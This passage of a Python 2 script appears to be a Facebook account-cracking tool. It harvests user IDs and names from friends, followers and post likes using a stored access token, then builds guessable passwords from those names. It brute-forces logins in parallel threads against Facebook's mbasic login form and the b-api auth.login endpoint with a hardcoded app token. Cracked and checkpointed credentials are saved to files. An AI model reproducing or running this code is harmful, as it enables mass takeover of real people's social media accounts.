            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successful dump id from public friends'%(P,H,P))
        print ' [%s•%s]%s copy output file 👉%s ( %s%s%s )'%(B,P,H,P,M,ppk,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except Exception as e:
        exit('\n %s[%s!%s] Failed dump id'%(P,M,P))
        
def followers():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print "\n %s[%s!%s] token/cookies invalid"%(P,M,P)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        idt = raw_input('\n [?] id follow  : ')
        ih  = raw_input(' [?] name file  : ')
        asw = raw_input(' [?] limit id   : ')
        pok = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=' + asw + '&access_token=' + toket)
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + ih + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successful dump id from total followers'%(P,H,P))
        print ' [%s•%s]%s copy output file 👉%s ( %s%s%s )'%(B,P,H,P,M,ah,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except Exception as e:
        exit('\n %s[%s!%s] Failed dump id'%(P,M,P))

def postingan():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print "\n %s[%s!%s] token/cookies invalid"%(P,M,P)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        idt = raw_input('\n [?] id posts   : ')
        ppk = raw_input(' [?] name file  : ')
        asw = raw_input(' [?] limit id   : ')
        kon = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=' + asw + '&access_token=' + toket)
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successful dump id from like post'%(P,H,P))
        print ' [%s•%s]%s copy output file 👉%s ( %s%s%s )'%(B,P,H,P,M,ikeh,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except Exception as e:
        exit('\n %s[%s!%s] Failed dump id'%(P,M,P))

mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
                                        results.append("123456")
                                        results.append("bangsat")
	return results

class crack_b_api:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    while True:
      f=raw_input('\n [?] password manual? [Y/n]: ')
      if f in[""," "]:
        continue
      elif f in["y","Y"]:
        try:
          while True:
            try:
              self.apk=raw_input(' [*] file dump : ')
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print '\n %s[%s!%s] file dump is not available, dump id first\n'%(P,M,P)
              time.sleep(3)
              moch_yayan()
          self.fl=[]
          print '\n %s[*] example: (%ssayang,doraemon,rahasia%s)'%(P,H,P)
          self.pw=raw_input(" [?] Password : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print '\n %s[%s!%s] file dump is not available, dump id first\n'%(P,M,P)
          time.sleep(3)
          moch_yayan()
        print '\n [+] total id -> [%s%s%s%s]' %(P,M,len(self.fl),P)
        print '\n [#] ok results saved to : ok-%s-%s-%s.txt' % (ha, op, ta)
        print ' [#] cp results saved to : cp-%s-%s-%s.txt' % (ha, op, ta)
        print ' [!] press ctrl+z to stop the crack process\n'
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        print '\n\n %s[%s#%s] crack done...'%(P,K,P)
        break
      elif f in["n","N"]:
        try:
          while True:
            try:
              self.apk=raw_input(' [*] file dump : ')
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print '\n %s[%s!%s] file dump is not available, dump id first\n'%(P,M,P)
              time.sleep(3)
              moch_yayan()
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print '\n [+] total id -> [%s%s%s%s]' %(P,M,len(self.fl),P)
        print '\n [#] ok results saved to : ok-%s-%s-%s.txt' % (ha, op, ta)
        print ' [#] cp results saved to : cp-%s-%s-%s.txt' % (ha, op, ta)
        print ' [!] press ctrl+z to stop the crack process\n'
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        print '\n\n %s[%s#%s] crack done...'%(P,K,P)
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if re.search('(EAAA)\\w+', response.text):
      print '\r  %s* --> %s|%s      %s' % (H,username,password,N)
      wrt = '%s|%s' % (username,password)
      self.ok.append(wrt)
      open('ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
      return True
    else:
      if 'www.facebook.com' in response.json()['error_msg']:
        print '\r  %s* --> %s|%s      %s' % (K,username,password,N)
        wrt = '%s|%s' % (username,password)
        self.cp.append(wrt)
        open('ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          pass
        print '\r [*] crack: %s/%s OK-:%s - CP-:%s%s '%(self.loop,len(self.fl),len(self.ok),len(self.cp),N),
        sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users['id'].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          pass
        print '\r [*] crack: %s/%s OK-:%s - CP-:%s%s '%(self.loop,len(self.fl),len(self.ok),len(self.cp),N),
        sys.stdout.flush()


class crack_mbasic():

    def __init__(self):
        self.ok = []
        self.cp = []
        self.loop = 0
        while True:
            f = raw_input('\n [?] password manual? [Y/n]: ')
            if f == '':
                continue
            elif f in["y","Y"]:
                try:
                    while True:
                        try:
                            self.apk = raw_input(' [*] file dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\n %s[%s!%s] file dump is not available, dump id first\n'%(P,M,P)
                            time.sleep(3)
                            moch_yayan()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '\n %s[%s!%s] file dump is not available, dump id first\n'%(P,M,P)
                    time.sleep(3)
                    moch_yayan()

                print '\n %s[*] example: (%ssayang,doraemon,rahasia%s)'%(P,H,P)
                self.pwlist()
                break
            elif f in["n","N"]:
                try:
                    while True:
                        try:
                            self.apk = raw_input(' [*] file dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\n %s[%s!%s] file dump is not available, dump id first\n'%(P,M,P)
                            time.sleep(3)
                            moch_yayan()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '\n %s[%s!%s] file dump is not available, dump id first\n'%(P,M,P)
                    time.sleep(3)
                    moch_yayan()

                print '\n [+] total id -> [%s%s%s%s]' %(P,M,len(self.fl),P)
                print '\n [#] ok results saved to : ok-%s-%s-%s.txt' % (ha, op, ta)
                print ' [#] cp results saved to : cp-%s-%s-%s.txt' % (ha, op, ta)
                print ' [!] press ctrl+z to stop the crack process\n'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\n %s[%s#%s] crack done...'%(P,K,P)
                exit()

    def pwlist(self):
        self.pw = raw_input(' [?] password : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\n [+] total id -> [%s%s%s%s]' %(P,M,len(self.fl),P)
            print '\n [#] ok results saved to : ok-%s-%s-%s.txt' % (ha, op, ta)
            print ' [#] cp results saved to : cp-%s-%s-%s.txt' % (ha, op, ta)
            print ' [!] press ctrl+z to stop the crack process\n'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\n %s[%s#%s] crack done...'%(P,K,P)
            exit()
            
    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r  %s* --> %s|%s      %s' % (H,fl.get('id'),i,N)
                    self.ok.append(' [OK] %s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [OK] %s|%s\n\n' % (fl.get('id'), i))
                    ko = ' [OK] %s|%s\n\n' % (fl.get('id'),i)
                    break
                elif log.get('status') == 'cp':
                    print '\r  %s* --> %s|%s      %s' % (K,fl.get('id'),i,N)
                    self.cp.append(' [CP] %s|%s' % (fl.get('id'), i))
                    open('cp-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [CP] %s|%s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.loop += 1
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w + ' [*] crack: %s/%s OK-:%s - CP-:%s%s '%(self.loop,len(self.fl),len(self.ok),len(self.cp),N),
            sys.stdout.flush()
        except:
            self.main(fl)

if __name__ == '__main__':
    negara()
